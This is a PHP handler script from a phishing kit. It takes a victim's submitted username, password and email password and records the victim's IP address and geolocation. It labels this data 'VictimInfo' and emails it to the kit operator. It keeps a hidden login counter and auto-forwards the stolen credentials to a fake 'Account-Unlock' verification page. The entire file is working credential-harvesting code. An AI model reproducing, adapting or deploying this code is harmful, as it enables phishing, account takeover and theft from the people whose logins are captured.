<?php @error_reporting(0);
include('../../result/detect.php');
require "session_protect.php";
require "functions.php";
$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass'];
$_SESSION['epass'] = $_POST['epass']; 
function curl($url, $var = null) 
      {$curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;}

$email	= $_POST['user'];
$password = $_POST['pass'];
$emelpassword = $_POST['epass'];

$nggon = curl("https://ipinfo.io/".$ip."/json");
$lokasi = json_decode($nggon);
$VictimInfo1 = ""."".$_SERVER['REMOTE_ADDR']." - [".$lokasi->org."]";
$VictimInfo2 = ""."".$lokasi->city.", ".$lokasi->region.", ".$lokasi->country."";
$VictimInfo4 = ""."".$systemInfo['browser'];
$VictimInfo5 = ""."".$systemInfo['os'];

include '../../result/res_login.php';
include '../../config.php';
$subject = "Login Info [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: Login Info <kucinghitam@server.tech>\r\n";
$headers .= "Content-Type: text/html\r\n";
mail($Your_Email, $subject, $message, $headers);

$file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._login_.txt";
$isi = @file_get_contents($file2);
$buka = fopen($file2, "w");
fwrite($buka, $isi + 1);

?>
<form action='../../Verify.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>